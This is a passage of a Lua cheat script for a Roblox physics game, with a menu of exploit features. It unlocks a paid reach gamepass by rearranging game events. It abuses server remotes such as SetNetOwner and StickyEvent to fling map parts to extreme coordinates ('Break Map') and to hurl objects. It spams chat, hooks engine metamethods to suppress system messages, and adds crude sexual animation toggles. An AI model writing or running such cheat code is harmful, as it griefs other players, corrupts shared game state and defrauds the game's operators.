        Text = "Reach Gamepass",
        Default = false,
        Callback = function(v)
            KozFlags.gamepass = v
            if v then
                local LineTexture = KozPLR:FindFirstChild("FartherReach")
                if LineTexture then LineTexture:Destroy() end
                local lv = Instance.new("BoolValue")
                lv.Name = "FartherReach"
                lv.Value = true
                lv.Parent = KozPLR
                KozState.gamepassScriptNotify = KozRS.GamepassEvents:FindFirstChild("FurtherReachBoughtNotifier")
                KozState.gamepassActivator = KozRS.MenuToys:FindFirstChild("LimitedTimeToyEvent")
                if KozState.gamepassScriptNotify then KozState.gamepassScriptNotify.Parent = Services.RF end
                if KozState.gamepassActivator then
                    KozState.gamepassActivator.Parent = KozRS.GamepassEvents
                    KozState.gamepassActivator.Name = "FurtherReachBoughtNotifier"
                end
                pcall(function()
                        KozPLR.Character.GrabbingScript.Enabled = false
                        KozPLR.Character.GrabbingScript.Enabled = true
                    end)
                task.delay(0.1, function()
                        if KozState.gamepassActivator then KozDisp:Fire(KozState.gamepassActivator) end
                    end)
                KozState.gamepassDiedHandle = KozPLR.CharacterAdded:Connect(function(Character)
                        Character:WaitForChild("GrabbingScript")
                        pcall(function()
                                Character.GrabbingScript.Enabled = false
                                Character.GrabbingScript.Enabled = true
                            end)
                        task.wait(0.1)
                        pcall(function()
                                if KozState.gamepassActivator then KozDisp:Fire(KozState.gamepassActivator) end
                            end)
                    end)
            else
                local LineTexture = KozPLR:FindFirstChild("FartherReach")
                if LineTexture then LineTexture:Destroy() end
                if KozState.gamepassScriptNotify then
                    KozState.gamepassScriptNotify.Parent = KozRS.GamepassEvents
                end
                if KozState.gamepassActivator then
                    KozState.gamepassActivator.Name = "LimitedTimeToyEvent"
                    KozState.gamepassActivator.Parent = KozRS.MenuToys
                end
                pcall(function()
                        KozPLR.Character.GrabbingScript.Enabled = false
                        KozPLR.Character.GrabbingScript.Enabled = true
                    end)
                if KozState.gamepassDiedHandle then KozState.gamepassDiedHandle:Disconnect() KozState.gamepassDiedHandle = nil end
                KozState.gamepassScriptNotify = nil
                KozState.gamepassActivator = nil
            end
        end
    })
    end
end
BreakMapGroup = Tabs.AurasTab:AddLeftGroupbox("Break Map", "bomb")

activePencils = {}

local function CreateOnePencil()
    local plr = Services.LocalPlayer
    local char = plr.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    local canSpawn = plr:FindFirstChild("CanSpawnToy")
    if canSpawn and not canSpawn.Value then
        local startWait = tick()
        repeat 
            task.wait(0.1) 
        until (canSpawn.Value) or (tick() - startWait > 3)
        if not canSpawn.Value then return false end
    end
    local inv = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
    if not inv then return false end
    local pencil = nil
    local connection = nil
    connection = inv.ChildAdded:Connect(function(child)
        if child.Name == "ToolPencil" then
            pencil = child
            if connection then connection:Disconnect() end
        end
    end)
    pcall(function()
        functions.SpawnToy:InvokeServer(
            "ToolPencil",
            hrp.CFrame * CFrame.new(0, 3, 8),
            Vector3.new(0, 0, 0)
        )
    end)
    local startTime = tick()
    repeat task.wait(0.05) until pencil or (tick() - startTime) > 3
    if connection then
        pcall(function() connection:Disconnect() end)
    end
    if pencil then
        table.insert(activePencils, pencil)
        return true
    end
    return false
end

local function BreakMap()
    activePencils = {}
    local created = 0
    while created < 1 do
        if CreateOnePencil() then
            created = created + 1
        end
        task.wait(0.4)
    end
    for _, pencil in ipairs(activePencils) do
        if pencil and pencil.Parent then
            local pencilPart = pencil:FindFirstChild("StickyPart") 
                or pencil:FindFirstChild("Handle")
                or pencil:FindFirstChildOfClass("BasePart")
            if not pencilPart then
                continue
            end
            pcall(function()
                functions.SetNetOwner:FireServer(pencilPart, pencilPart.CFrame)
            end)
            task.wait(0.1)
            pcall(function()
                functions.SetNetOwner:FireServer(pencilPart, pencilPart.CFrame)
            end)
            task.wait(0.05)
            pcall(function() 
                functions.DestroyLine:FireServer(pencilPart)
            end)
            local baseGround = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("BaseGround")
            local targetPart = nil
            if baseGround then
                local children = baseGround:GetChildren()
                targetPart = children[154]
                if not targetPart or not targetPart:IsA("BasePart") then
                    for _, child in ipairs(children) do
                        if child:IsA("BasePart") then
                            targetPart = child
                            break
                        end
                    end
                end
            end
            if not targetPart then
                local map = workspace:FindFirstChild("Map")
                if map then
                    for _, child in ipairs(map:GetDescendants()) do
                        if child:IsA("BasePart") and child.Size.Magnitude > 100 then
                            targetPart = child
                            break
                        end
                    end
                end
            end
            if pencilPart and targetPart then
                local extremeCF = CFrame.new(
                    1e9, 1e9, 1e9,
                    1, 0, 0,
                    0, 1, 0,
                    0, 0, 1
                )
                pcall(function() 
                    functions.StickyEvent:FireServer(pencilPart, targetPart, extremeCF)
                end)
                task.wait(0.1)
                pcall(function() 
                    functions.StickyEvent:FireServer(pencilPart, targetPart, extremeCF)
                end)
                task.wait(0.05)
                local posCF = CFrame.new(1e9, 1e9, 1e9)
                pcall(function() 
                    functions.StickyEvent:FireServer(pencilPart, targetPart, posCF)
                end)
            end
            task.delay(2, function()
                pcall(function()
                    if pencil and pencil.Parent then
                        functions.DestroyToy:FireServer(pencil)
                    end
                end)
            end)
        end
    end
end

BreakMapGroup:AddButton({
    Text = "Break Map (ToolPencil required)",
    Func = function()
        task.spawn(BreakMap)
        if Library then
            Library:Notify({
                Title = "Break Map",
                Description = "Attempting to break map...",
                Duration = 3,
                Type = "info"
            })
        end
    end
})

-- =====================================================================
-- [KOZMOZ PORT] Fun kutusu
-- musa(4) kaynagindan tasiindi; Obsidian elemanlarina uyarlandi ve
-- musa'daki davranisin tamami (durum + yardimci fonksiyonlar) korundu.
-- =====================================================================
FunGroup = Tabs.AurasTab:AddLeftGroupbox("Fun", "star")
do
    -- musa'daki notify() karsiligi (Obsidian bildirim sistemi)
    local function notify(msg, time)
        pcall(function()
            Library:Notify({Title = "Kozmoz", Description = tostring(msg), Duration = time or 3})
        end)
    end
    FunGroup:AddToggle("KozPushLocal", {
        Text = "Push Local Player",
        Default = false,
        Callback = function(v)
            KozFlags.pushLocal = v
        end
    })
    FunGroup:AddLabel("Push Key"):AddKeyPicker("KozPushKey", {
        Text = "Push Key",
        Default = "None",
        Mode = "Toggle",
        Callback = function()
            if not KozFlags.pushLocal then return end
            local char = KozPLR.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root then
                local dir = Camera.CFrame.LookVector.Unit
                root.AssemblyLinearVelocity = root.AssemblyLinearVelocity + (dir * KozFlags.pushForce)
            end
        end
    })
    FunGroup:AddSlider("KozPushForce", {
        Text = "Push Force",
        Min = 20,
        Max = 200,
        Default = 100,
        Rounding = 0,
        Suffix = "Force",
        Callback = function(v)
            KozFlags.pushForce = v
        end
    })
    local function getChatMethod(pew)
        local cmd = pew and "/e pew" or "/e dance"
        local ok, tcs = pcall(function() return game:GetService("TextChatService") end)
        if ok and tcs then
            local channels = tcs:FindFirstChild("TextChannels")
            if channels then
                local channel = channels:FindFirstChild("RBXGeneral")
                if channel then
                    return function() channel:SendAsync(cmd) end
                end
            end
        end
        if KozRS:FindFirstChild("ChatEvents") then
            local ce = KozRS.ChatEvents
            if ce:FindFirstChild("SayMessageRequest") then
                return function() KozDisp:Fire(ce.SayMessageRequest, cmd, "All") end
            elseif ce:FindFirstChild("sayMessage") then
                return function() KozDisp:Fire(ce.sayMessage, cmd, "All") end
            end
        end
        return nil
    end
    local spamDanceActive = false
    local spamDanceConn = nil
    local spamDanceLastTime = 0
    local spamDanceChatMethod = nil
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    local spamPewActive = false
    local spamPewConn = nil
    local spamPewLastTime = 0
    local spamPewChatMethod = nil
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    KozRun.RenderStepped:Connect(function()
        local t = tick()
        if spamDanceActive then
            if not spamDanceChatMethod then spamDanceChatMethod = getChatMethod(false) end
            if not spamDanceConn then
                spamDanceLastTime = 0
                spamDanceConn = true
            end
            if spamDanceChatMethod and (t - spamDanceLastTime) >= 0.1 then
                spamDanceLastTime = t
                pcall(spamDanceChatMethod)
            end
        else
            if spamDanceConn then spamDanceConn = nil end
        end
        if spamPewActive then
            if not spamPewChatMethod then spamPewChatMethod = getChatMethod(true) end
            if not spamPewConn then
                spamPewLastTime = 0
                spamPewConn = true
            end
            if spamPewChatMethod and (t - spamPewLastTime) >= 0.1 then
                spamPewLastTime = t
                pcall(spamPewChatMethod)
            end
        else
            if spamPewConn then spamPewConn = nil end
        end
    end)
    local function isEmoteBlocked(text)
        if type(text) ~= "string" then return false end
        return string.find(string.lower(text), "emote here", 1, true) ~= nil
    end
    pcall(function()
        local oldNamecall
        oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            if (spamDanceActive or spamPewActive) and getnamecallmethod() == "DisplaySystemMessage" then
                if isEmoteBlocked(select(1, ...)) then return end
            end
            return oldNamecall(self, ...)
        end))
    end)
    pcall(function()
        local tcs = game:GetService("TextChatService")
        if not tcs then return end
        local oldIncoming = tcs.OnIncomingMessage
        tcs.OnIncomingMessage = function(message)
            if (spamDanceActive or spamPewActive) and isEmoteBlocked(message and message.Text) then
                -- yeni TextChatService API'si TextChatMessageProperties bekler
                local kozProps = Instance.new("TextChatMessageProperties")
                kozProps.Status = Enum.TextChatMessageStatus.Removed
                return kozProps
            end
            if oldIncoming then
                local ok, res = pcall(oldIncoming, message)
                if ok and (res == nil or typeof(res) == "TextChatMessageProperties") then
                    return res
                end
            end
            return nil
        end
    end)
    pcall(function()
        local plrGui = KozPLR and KozPLR:FindFirstChild("PlayerGui")
        local function getChatFrame()
            local chat = plrGui and plrGui:FindFirstChild("Chat")
            local frame = chat and chat:FindFirstChild("Frame")
            return frame and frame:FindFirstChild("ChatFrame")
        end
        local hooked = {}
        local function installHooks()
            local cf = getChatFrame()
            if not cf then return false end
            local allDone = true
            for _, name in ipairs({ "AddSystemMessage", "AddMessage" }) do
                if not hooked[name] then
                    local orig = cf[name]
                    if type(orig) == "function" then
                        hooked[name] = orig
                        cf[name] = function(self, ...)
                            local msg = select(1, ...)
                            if type(msg) == "table" then msg = msg.Message end
                            if (spamDanceActive or spamPewActive) and isEmoteBlocked(msg) then return end
                            return orig(self, ...)
                        end
                    else
                        allDone = false
                    end
                end
            end
            return allDone
        end
        if not installHooks() then
            task.spawn(function()
                while not installHooks() do task.wait(0.5) end
            end)
        end
    end)
    local saltoFlipConnection = nil
    local isSaltoActive = false
    local SALTO_H = 0.0174533
    local function doSalto()
        if isSaltoActive then return end
        isSaltoActive = true
        local char = KozPLR.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") then
            isSaltoActive = false
            return
        end
        local hrp = char.HumanoidRootPart
        local hum = char.Humanoid
        if saltoFlipConnection then saltoFlipConnection:Disconnect() saltoFlipConnection = nil end
        hum:ChangeState("Jumping")
        hum.Sit = true
        local velocity = hrp:FindFirstChild("BodyVelocity") or Instance.new("BodyVelocity")
        velocity.Velocity = Vector3.new(0, 30, 0)
        velocity.MaxForce = Vector3.new(0, math.huge, 0)
        velocity.Parent = hrp
        task.delay(0.1, function()
            if velocity and velocity.Parent then velocity:Destroy() end
        end)
        local rotValue = SALTO_H
        local rotAxis = {1, 0, 0}
        local rotSign = 1
        local startTime = tick()
        local duration = 0.8
        local totalRotation = 360
        local completed = false
        local prevRotation = 0
        saltoFlipConnection = KozRun.RenderStepped:Connect(function(delta)
            if not char or not hrp or not hum or not hrp.Parent then
                if saltoFlipConnection then saltoFlipConnection:Disconnect() saltoFlipConnection = nil end
                isSaltoActive = false
                return
            end
            local elapsed = tick() - startTime
            if elapsed >= duration then
                if not completed then
                    completed = true
                    hum.Sit = false
                    if saltoFlipConnection then saltoFlipConnection:Disconnect() saltoFlipConnection = nil end
                    isSaltoActive = false
                end
                return
            end
            local progress = elapsed / duration
            local easeProgress = progress
            if progress < 0.5 then
                easeProgress = 2 * progress * progress
            else
                easeProgress = 1 - (math.pow((-2 * progress) + 2, 2) / 2)
            end
            local targetRotation = totalRotation * easeProgress
            local lastRotation = totalRotation * math.max(0, easeProgress - (delta / duration))
            local frameRotation = (targetRotation - lastRotation) * SALTO_H
            local sign = rotValue > 0 and 1 or -1
            local angle = CFrame.Angles(rotAxis[1] * frameRotation * sign, rotAxis[2] * frameRotation * sign, rotAxis[3] * frameRotation * sign)
            if hrp and hrp.Parent then
                hrp.CFrame = hrp.CFrame * angle
            end
            hum.Sit = true
        end)
        task.delay(duration + 0.2, function()
            if saltoFlipConnection then saltoFlipConnection:Disconnect() saltoFlipConnection = nil end
            if char and hum then hum.Sit = false end
            isSaltoActive = false
        end)
    end
    -- [KOZMOZ] "miscKeybindsSec" baska bolumun elemani, tasinmadi
    do
        local function getSaltoKey()
            local ok, data = pcall(function()
                        return Library.Options and Library.Options["KozSaltoKey"]
                    end)
            if ok and data and type(data) == "table" then
                local keyName = data.Value or data.Key or ""
                if keyName ~= "" then
                    local codeOk, code = pcall(function() return Enum.KeyCode[keyName] end)
                    if codeOk and code and code ~= Enum.KeyCode.Unknown then return code end
                    local typeOk, itype = pcall(function() return Enum.UserInputType[keyName] end)
                    if typeOk and itype then return itype end
                end
            end
            return nil
        end
        local saltoTriggered = false
        UserInputService.InputBegan:Connect(function(input, gp)
            if gp then return end
            local key = getSaltoKey()
            if not key then return end
            local matched = false
            if key.EnumType == Enum.UserInputType and input.UserInputType == key then matched = true
            elseif key.EnumType == Enum.KeyCode and input.KeyCode == key then matched = true end
            if matched and not saltoTriggered and not isSaltoActive then
                saltoTriggered = true
                doSalto()
            end
        end)
        UserInputService.InputEnded:Connect(function(input, gp)
            local key = getSaltoKey()
            if not key then return end
            local matched = false
            if key.EnumType == Enum.UserInputType and input.UserInputType == key then matched = true
            elseif key.EnumType == Enum.KeyCode and input.KeyCode == key then matched = true end
            if matched then saltoTriggered = false end
        end)
    end
    KozFlags.cloneFlingActive = false
    KozFlags.cloneFlingTarget = "Auto"
    local cloneFlingConn = nil
    local cloneFlingTargets = {
        ["UFO 1"] = function()
            return KozWS.Map.AlwaysHereTweenedObjects.InnerUFO.Object.ObjectModel:GetChildren()[16]
        end,
        ["UFO 2"] = function()
            return KozWS.Map.AlwaysHereTweenedObjects.OuterUFO.Object.ObjectModel.CylinderOctagon
        end,
        ["Train"] = function()
            return KozWS.Map.AlwaysHereTweenedObjects.Train.Object.ObjectModel:GetChildren()[29]
        end,
        ["Beach 1"] = function()
            return KozWS.Map.AlwaysHereTweenedObjects.LrgDebris.Object.ObjectModel:GetChildren()[4]
        end,
        ["Beach 2"] = function()
            return KozWS.Map.AlwaysHereTweenedObjects.LrgDebris2.Object.ObjectModel:GetChildren()[2]
        end,
        ["CaveCart"] = function()
            return KozWS.Map.AlwaysHereTweenedObjects.CaveCart.Object.ObjectModel:GetChildren()[8]
        end,
    }
    local function findDensePart()
        local root = KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart")
        if not root then return nil end
        local playerPos = root.Position
        local scanRadius = 100
        local clusterRadius = 15
        local parts = {}
        local allParts = KozWS:GetDescendants()
        for i = 1, #allParts do
            local obj = allParts[i]
            if obj:IsA("BasePart") then
                local pos = obj.Position
                local dx = pos.X - playerPos.X
                local dy = pos.Y - playerPos.Y
                local dz = pos.Z - playerPos.Z
                if dx * dx + dy * dy + dz * dz < scanRadius * scanRadius then
                    parts[#parts + 1] = obj
                end
            end
        end
        if #parts == 0 then return nil end
        local bestPart = parts[1]
        local bestCount = 0
        for i = 1, #parts do
            local p = parts[i]
            local pPos = p.Position
            local count = 0
            for j = 1, #parts do
                if i ~= j then
                    local qPos = parts[j].Position
                    local dx = qPos.X - pPos.X
                    local dy = qPos.Y - pPos.Y
                    local dz = qPos.Z - pPos.Z
                    if dx * dx + dy * dy + dz * dz < clusterRadius * clusterRadius then
                        count = count + 1
                    end
                end
            end
            if count > bestCount then
                bestCount = count
                bestPart = p
            end
        end
        return bestPart
    end
    FunGroup:AddDropdown("KozCloneFlingTarget", {
        Text = "Clone Fling Object",
        Values = {"UFO 1", "UFO 2", "Train", "Beach 1", "Beach 2", "CaveCart"},
        Callback = function(value)
            KozFlags.cloneFlingTarget = value
        end
    })
    FunGroup:AddToggle("KozCloneFling", {
        Text = "Clone Fling Object",
        Default = false,
        Callback = function(v)
            KozFlags.cloneFlingActive = v
            if not v then
                if cloneFlingConn then pcall(function() cloneFlingConn:Disconnect() end) cloneFlingConn = nil end
                return
            end
            task.spawn(function()
                    local GE = KozRS:WaitForChild("GrabEvents")
                    local SetNetworkOwner = GE:WaitForChild("SetNetworkOwner")
                    local CreateGrabLine = GE:WaitForChild("CreateGrabLine")
                    local DestroyGrabLine = GE:WaitForChild("DestroyGrabLine")
                    local char = KozPLR.Character
                    local myRoot = char and char:FindFirstChild("HumanoidRootPart")
                    if not char or not myRoot then return end
                    local canSpawn = KozPLR:WaitForChild("CanSpawnToy", 5)
                    if not canSpawn or not canSpawn.Value then
                        local wt = tick()
                        while canSpawn and not canSpawn.Value and tick() - wt < 5 do task.wait(0.1) end
                    end
                    if not canSpawn or not canSpawn.Value then notify("Cannot spawn toy") KozFlags.cloneFlingActive = false return end
                    local inv = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
                    local oldDecoys = {}
                    if inv then for _, d in ipairs(inv:GetChildren()) do if d.Name == "YouDecoy" then oldDecoys[d] = true end end end
                    pcall(function() KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "YouDecoy", myRoot.CFrame, Vector3.zero) end)
                    task.wait(0.15)
                    inv = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
                    local clone = nil
                    if inv then for _, d in ipairs(inv:GetChildren()) do if d.Name == "YouDecoy" and not oldDecoys[d] then clone = d break end end end
                    if not clone or not clone:FindFirstChild("HumanoidRootPart") then notify("YouDecoy not found") KozFlags.cloneFlingActive = false return end
                    local cloneHRP = clone.HumanoidRootPart
                    local char2 = KozPLR.Character
                    local myRoot2 = char2 and char2:FindFirstChild("HumanoidRootPart")
                    if not myRoot2 then return end
                    myRoot2.CFrame = cloneHRP.CFrame
                    task.wait(0.3)
                    for _ = 1, 2 do
                        KozDisp:Fire(SetNetworkOwner, cloneHRP, cloneHRP.CFrame)
                        KozRun.Heartbeat:Wait()
                        KozDisp:Fire(CreateGrabLine, cloneHRP, Vector3.zero, cloneHRP.Position, false)
                        KozRun.Heartbeat:Wait()
                        KozDisp:Fire(DestroyGrabLine, cloneHRP)
                        KozRun.Heartbeat:Wait()
                    end
                    local function getTargetPart()
                        if KozFlags.cloneFlingTarget == "Auto" then
                            return findDensePart()
                        end
                        local fn = cloneFlingTargets[KozFlags.cloneFlingTarget]
                        if not fn then return nil end
                        local ok, res = pcall(fn)
                        return ok and res or nil
                    end
                    local lastTarget = nil
                    local findInterval = 0
                    cloneFlingConn = KozRun.Heartbeat:Connect(function(dt)
                            if not KozFlags.cloneFlingActive or not clone or not clone.Parent or not cloneHRP or not cloneHRP.Parent then
                                KozFlags.cloneFlingActive = false
                                return
                            end
                            findInterval = findInterval + dt
                            if KozFlags.cloneFlingTarget == "Auto" then
                                if findInterval >= 0.5 then
                                    findInterval = 0
                                    lastTarget = getTargetPart()
                                end
                            else
                                if findInterval >= 0.5 then
                                    findInterval = 0
                                    lastTarget = getTargetPart()
                                end
                            end
                            if not lastTarget or not lastTarget.Parent then
                                lastTarget = getTargetPart()
                            end
                            if not lastTarget then return end
                            pcall(function()
                                    cloneHRP.CFrame = lastTarget.CFrame
                                    cloneHRP.AssemblyLinearVelocity = Vector3.new(
                                        math.random(-50, 50),
                                        math.random(100, 200),
                                        math.random(-50, 50)
                                    )
                                    cloneHRP.AssemblyAngularVelocity = Vector3.new(
                                        math.random(-200, 200) * 100,
                                        math.random(-200, 200) * 100,
                                        math.random(-200, 200) * 100
                                    )
                                end)
                            task.wait(0.5)
                        end)
                end)
        end
    })
    local cachedBombs = {}
    local explosionMissileType = "BombMissile"
    local explosionTargetName = nil
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    local explosionTargetCombo
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    local explosionTargetCombo = setmetatable({}, {__index = function() return function() end end}) -- bos eleman (kaynak bolumu tasindi)
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    local cacheHeld = false
    local cacheConn = nil
    local cacheConnection = nil
    local autoCacheTask = nil
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    -- [KOZMOZ] "miscExplosionSec" baska bolumun elemani, tasinmadi
    FunGroup:AddToggle("KozMasturbToggle", {
        Text = "Jerk",
        Default = false,
        Callback = function(on)
            KozFlags.masturb = on
            if on then
                local char = KozPLR.Character or KozPLR.CharacterAdded:Wait()
                local hum = char:FindFirstChildOfClass("Humanoid")
                if not hum then return end
                local animator = hum:FindFirstChildOfClass("Animator")
                if not animator then
                    animator = Instance.new("Animator")
                    animator.Parent = hum
                end
                local anim = Instance.new("Animation")
                anim.AnimationId = "rbxassetid://168268306"
                KozState.masturbAnimTrack = animator:LoadAnimation(anim)
                KozState.masturbAnimTrack.Priority = Enum.AnimationPriority.Action
                KozState.masturbAnimTrack:Play()
                KozState.masturbLoop = task.spawn(function()
                        while KozFlags.masturb do
                            task.wait(0.1)
                            if KozState.masturbAnimTrack and KozState.masturbAnimTrack.IsPlaying then
                                KozState.masturbAnimTrack.TimePosition = 0.3
                            end
                        end
                    end)
            else
                if KozState.masturbAnimTrack then
                    KozState.masturbAnimTrack:Stop()
                    KozState.masturbAnimTrack = nil
                end
                KozState.masturbLoop = nil
            end
        end
    })
    FunGroup:AddToggle("KozFakeDeath", {
        Text = "Fake Death",
        Default = false,
        Callback = function(on)
            KozFlags.fakeDeath = on
            local char = KozPLR.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not hum then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if on then
                KozState.fakeDeathAnimConn = nil
                KozState.fakeDeathRagdollLoop = nil
                local savedWalkSpeed = hum.WalkSpeed
                local savedJumpPower = hum.JumpPower
                local savedJumpHeight = hum.JumpHeight
                KozState.fakeDeathSavedSpeed = savedWalkSpeed
                KozState.fakeDeathSavedJumpPower = savedJumpPower
                KozState.fakeDeathSavedJumpHeight = savedJumpHeight
                hum.WalkSpeed = 0
                hum.JumpPower = 0
                hum.JumpHeight = 0
                local animator = hum:FindFirstChildOfClass("Animator")
                if animator then
                    for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
                        track:Stop(0)
                    end
                    KozState.fakeDeathAnimConn = animator.AnimationPlayed:Connect(function(track)
                            if KozFlags.fakeDeath then task.defer(function() track:Stop(0) end) end
                        end)
                end
                hum.BreakJointsOnDeath = false
                KozDisp:Fire(KozRemote.RagdollRemote, hrp, 2)
                hum.PlatformStand = true
                KozState.fakeDeathRagdollLoop = task.spawn(function()
                        while KozFlags.fakeDeath do
                            task.wait(0.05)
                            local c = KozPLR.Character
                            local h = c and c:FindFirstChildOfClass("Humanoid")
                            local r = c and c:FindFirstChild("HumanoidRootPart")
                            if h and r and h.Health > 0 then
                                KozDisp:Fire(KozRemote.RagdollRemote, r, 0.5)
                                h.PlatformStand = true
                            end
                        end
                    end)
                if KozState.fakeDeathCharAdded then KozState.fakeDeathCharAdded:Disconnect() end
                KozState.fakeDeathCharAdded = KozPLR.CharacterAdded:Connect(function(newChar)
                        KozFlags.fakeDeath = false
                        if KozState.fakeDeathAnimConn then KozState.fakeDeathAnimConn:Disconnect() KozState.fakeDeathAnimConn = nil end
                        KozState.fakeDeathRagdollLoop = nil
                        if KozState.fakeDeathCharAdded then KozState.fakeDeathCharAdded:Disconnect() KozState.fakeDeathCharAdded = nil end
                    end)
            else
                KozFlags.fakeDeath = false
                task.wait(0.5)
                if KozState.fakeDeathAnimConn then KozState.fakeDeathAnimConn:Disconnect() KozState.fakeDeathAnimConn = nil end
                KozState.fakeDeathRagdollLoop = nil
                if KozState.fakeDeathCharAdded then KozState.fakeDeathCharAdded:Disconnect() KozState.fakeDeathCharAdded = nil end
                hum.WalkSpeed = KozState.fakeDeathSavedSpeed or 16
                hum.JumpPower = KozState.fakeDeathSavedJumpPower or 50
                hum.JumpHeight = KozState.fakeDeathSavedJumpHeight or 7.2
                KozState.fakeDeathSavedSpeed = nil
                KozState.fakeDeathSavedJumpPower = nil
                KozState.fakeDeathSavedJumpHeight = nil
                KozDisp:Fire(KozRemote.RagdollRemote, hrp, 0)
                hum.PlatformStand = false
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                if hrp then
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero
                end
            end
        end
    })
    FunGroup:AddToggle("KozCoconutDick", {
        Text = "Coconut Dick",
        Default = false,
        Callback = function(v)
            KozFlags.coconutDick = v
            if not v then
                if KozState.coconutDickTask then task.cancel(KozState.coconutDickTask) KozState.coconutDickTask = nil end
                return
            end
            KozState.coconutDickTask = task.spawn(function()
                    local Me = KozPLR
                    local SetNetworkOwner = KozRemote.SetNetworkOwner
                    local SpawnToy = KozRemote.SpawnToyRemoteFunction
                    local DestroyToy = KozRemote.DestroyToy
                    local Offsets = {
                        [1] = CFrame.new(-0.45, -1.2, -0.7),
                        [2] = CFrame.new(0.45, -1.2, -0.7),
                        [3] = CFrame.new(0, -1, 0.8),
                    }
                    local Coconuts = {}
                    while KozFlags.coconutDick do
                        local Character = Me.Character
                        local Root = Character and Character:FindFirstChild("HumanoidRootPart")
                        if not Root then
                            task.wait(0.1)
                            continue
                        end
                        local Folder = KozWS:FindFirstChild(Me.Name .. "SpawnedInToys")
                        if not Folder then
                            task.wait(0.1)
                            continue
                        end
                        local Length = 8
                        local Damping = 100
                        table.clear(Coconuts)
                        for _, Toy in ipairs(Folder:GetChildren()) do
                            if Toy.Name == "FoodCoconut" then
                                table.insert(Coconuts, Toy)
                            end
                        end
                        if #Coconuts < (Length + 2) then
                            task.spawn(function()
                                    KozDisp:Invoke(SpawnToy, "FoodCoconut", Root.CFrame * CFrame.new(-5, 0, 10), Vector3.zero)
                                end)
                        end
                        for i, Coconut in ipairs(Coconuts) do
                            local Part = Coconut:FindFirstChild("SoundPart")
                            local HoldPart = Coconut:FindFirstChild("HoldPart")
                            local Rigid = HoldPart and HoldPart:FindFirstChild("RigidConstraint")
                            local PartOwner = Part and Part:FindFirstChild("PartOwner")
                            if Part and HoldPart and Rigid then
                                if PartOwner and PartOwner.Value == Me.Name then
                                    if i <= 2 then
                                        Part.CFrame = Root.CFrame * Offsets[i] * CFrame.new(Root.Velocity / Damping)
                                    else
                                        Part.CFrame = Root.CFrame * Offsets[3] * CFrame.new(Root.Velocity / Damping) * CFrame.new(0, 0, Offsets[3].Z - (i + 0.2))
                                    end
                                    Part.Velocity = Vector3.zero
                                else
                                    KozDisp:Fire(SetNetworkOwner, Part, Part.CFrame)
                                end
                                if Rigid.Attachment1 then
                                    KozDisp:Fire(DestroyToy, Coconut)
                                end
                                for _, PartObj in ipairs(Coconut:GetChildren()) do
                                    if PartObj:IsA("BasePart") then
                                        PartObj.CanCollide = false
                                        PartObj.CanQuery = false
                                        if PartObj.Transparency ~= 1 then
                                            PartObj.Transparency = 0
                                        end
                                    end
                                end
                            end
                        end
                        task.wait(0.01)
                    end
                end)
        end
    })
    FunGroup:AddToggle("KozCoconutDiggles", {
        Text = "Coconut Boobs",
        Default = false,
        Callback = function(v)
            KozFlags.coconutDiggles = v
            if not v then
                if KozState.coconutDigglesTask then task.cancel(KozState.coconutDigglesTask) KozState.coconutDigglesTask = nil end
                return
            end
            KozState.coconutDigglesTask = task.spawn(function()
                    local Me = KozPLR
                    local SetNetworkOwner = KozRemote.SetNetworkOwner
                    local SpawnToy = KozRemote.SpawnToyRemoteFunction
                    local DestroyToy = KozRemote.DestroyToy
                    local Coconuts = {}
                    while KozFlags.coconutDiggles do
                        local Character = Me.Character
                        local Root = Character and Character:FindFirstChild("HumanoidRootPart")
                        if not Root then
                            task.wait(0.1)
                            continue
                        end
                        local Folder = KozWS:FindFirstChild(Me.Name .. "SpawnedInToys")
                        if not Folder then
                            task.wait(0.1)
                            continue
                        end
                        table.clear(Coconuts)
                        for _, Toy in ipairs(Folder:GetChildren()) do
                            if Toy.Name == "FoodCoconut" and Toy:GetAttribute("CoconutRole") == "Boobs" then
                                table.insert(Coconuts, Toy)
                            end
                        end
                        if #Coconuts < 2 then
                            for _, Toy in ipairs(Folder:GetChildren()) do
                                if Toy.Name == "FoodCoconut" and Toy:GetAttribute("CoconutRole") == nil then
                                    Toy:SetAttribute("CoconutRole", "Boobs")
                                    table.insert(Coconuts, Toy)
                                    if #Coconuts >= 2 then break end
                                end
                            end
                        end
                        if #Coconuts < 2 then
                            for _ = 1, 2 - #Coconuts do
                                task.spawn(function()
                                        local toy = KozDisp:InvokeSync(SpawnToy, "FoodCoconut", Root.CFrame * CFrame.new(-5, 0, 10), Vector3.zero)
                                        pcall(function()
                                                if toy and toy:IsA("Instance") then toy:SetAttribute("CoconutRole", "Boobs") end
                                            end)
                                    end)
                            end
                        end
                        for i = 1, math.min(2, #Coconuts) do
